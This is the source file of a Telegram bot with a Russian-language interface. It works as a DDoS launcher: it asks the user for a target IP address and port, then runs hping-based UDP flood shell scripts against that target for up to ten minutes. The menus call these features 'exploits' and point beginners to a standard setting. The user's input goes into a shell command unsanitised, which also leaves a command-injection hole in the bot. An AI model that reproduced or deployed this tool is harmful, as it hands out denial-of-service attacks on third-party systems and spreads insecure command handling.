import asyncio
import os
import signal

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text

import utils
from keyboards.default import start_markup, back_menu_markup
from keyboards.default.scripts import stop_script_markup
from keyboards.default.scripts.ddos.ddos_hping import choose_method_markup
from keyboards.default.scripts.ddos.ddos_hping.choose_ddos_hping_markup import choose_ddos_hping_markup
from loader import dp
from states.ddos_states import DdosHpingState
from states.ddos_states.DdosHpingOptionsState import UdpPackDdosHpingState
from utils.misc import rate_limit
from utils.scripts.ddos import start_script, communicate_script
from utils.scripts.ddos.ddos_hping.udp_pack import stop_script


@rate_limit(0.5)
@dp.message_handler(state=UdpPackDdosHpingState.method)
async def enter_dos(message: types.Message, state: FSMContext):
    if message.text == "Назад":
        async with state.proxy() as state_data:
            state_data.pop("ddos_hping_options")
        await message.answer("Выберите метод HighPing DDos-атаки.", reply_markup=choose_ddos_hping_markup)
        await DdosHpingState.ddos_hping_options.set()
    elif message.text == "В главное меню":
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    elif message.text in ["Standard", "Custom"]:
        async with state.proxy() as state_data:
            state_data["method"] = message.text.lower()
        await message.answer("Введите IP-адрес.", reply_markup=back_menu_markup)
        await UdpPackDdosHpingState.ip.set()
    else:
        await message.answer("Неверный ввод. Попробуйте ещё раз.")


@rate_limit(0.5)
@dp.message_handler(state=UdpPackDdosHpingState.ip)
async def enter_dos(message: types.Message, state: FSMContext):
    if message.text == "Назад":
        async with state.proxy() as state_data:
            state_data.pop("method")
        await message.answer("Выберите вариацию атаки. Стандартный вариант рекомендуется для новичков.\n"
                             "Стандартные параметры для UdpPack:\n"
                             "• порт - 443.\n",
                             reply_markup=choose_method_markup)
        await UdpPackDdosHpingState.method.set()
    elif message.text == "В главное меню":
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    else:
        async with state.proxy() as state_data:
            state_data["ip"] = message.text.lower()
        if (await state.get_data())["method"] == "standard":
            async with state.proxy() as state_data:
                script_path = os.path.dirname(os.path.abspath(utils.scripts.ddos.ddos_hping.udp_pack.__file__))
                cmd = f"sh '{script_path}/start_standard.sh' {state_data['ip']}"
            await UdpPackDdosHpingState.stop_script.set()
            proc = await start_script(cmd)
            await message.answer("Для остановки скрипта введите STOP.", reply_markup=stop_script_markup)
            task1 = asyncio.create_task(stop_script(proc), name='stop_script')
            task2 = asyncio.create_task(communicate_script(cmd, proc), name='communicate_script')
            tasks = [task1, task2]
            finished, unfinished = await asyncio.wait(tasks, timeout=600, return_when=asyncio.FIRST_COMPLETED)
            check = False
            if len(unfinished) == 2:
                check = True
                os.kill(proc.pid, signal.SIGTERM)
            for task in unfinished:
                if task.get_name() == 'stop_script' and not check:
                    check = True
                    os.kill(proc.pid, signal.SIGTERM)
                task.cancel()
            if check:
                await message.answer("Скрипт был успешно выполнен.")
            await state.reset_state()
        elif (await state.get_data())["method"] == "custom":
            await message.answer("Введите порт из диапазона [0—65535].")
            await UdpPackDdosHpingState.port.set()


@rate_limit(0.5)
@dp.message_handler(state=UdpPackDdosHpingState.port)
async def enter_dos(message: types.Message, state: FSMContext):
    if message.text == "Назад":
        async with state.proxy() as state_data:
            state_data.pop("ip")
        await message.answer("Введите IP-адрес.")
        await UdpPackDdosHpingState.ip.set()
    elif message.text == "В главное меню":
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    elif message.text.isnumeric():
        port = int(message.text)
        if 65535 >= port >= 0:
            async with state.proxy() as state_data:
                state_data["port"] = port
                script_path = os.path.dirname(os.path.abspath(utils.scripts.ddos.ddos_hping.udp_pack.__file__))
                cmd = f"sh '{script_path}/start_custom.sh' {state_data['port']} {state_data['ip']}"
            await UdpPackDdosHpingState.stop_script.set()
            proc = await start_script(cmd)
            await message.answer("Для остановки скрипта введите STOP.", reply_markup=stop_script_markup)
            task1 = asyncio.create_task(stop_script(proc), name='stop_script')
            task2 = asyncio.create_task(communicate_script(cmd, proc), name='communicate_script')
            tasks = [task1, task2]
            finished, unfinished = await asyncio.wait(tasks, timeout=600, return_when=asyncio.FIRST_COMPLETED)
            check = False
            if len(unfinished) == 2:
                check = True
                os.kill(proc.pid, signal.SIGTERM)
            for task in unfinished:
                if task.get_name() == 'stop_script' and not check:
                    check = True
                    os.kill(proc.pid, signal.SIGTERM)
                task.cancel()
            if check:
                await message.answer("Скрипт был успешно выполнен.")
            await state.reset_state()
        else:
            await message.answer("Число не из диапазона. Попробуйте ещё раз.")
    else:
        await message.answer("Неверный ввод. Попробуйте ещё раз.")


@rate_limit(0.5)
@dp.message_handler(Text(equals=["STOP"]), state=UdpPackDdosHpingState.stop_script)
async def stop_dos_script(message: types.Message, state: FSMContext):
    await UdpPackDdosHpingState.stopped_script.set()
    await message.answer("Скрипт останавливается, пожалуйста подождите.")
    await asyncio.sleep(2)
    await state.reset_state()
    await message.answer("Скрипт был остановлен. Возврат в главное меню.\n"
                         "Выберите эксплойт.", reply_markup=start_markup)
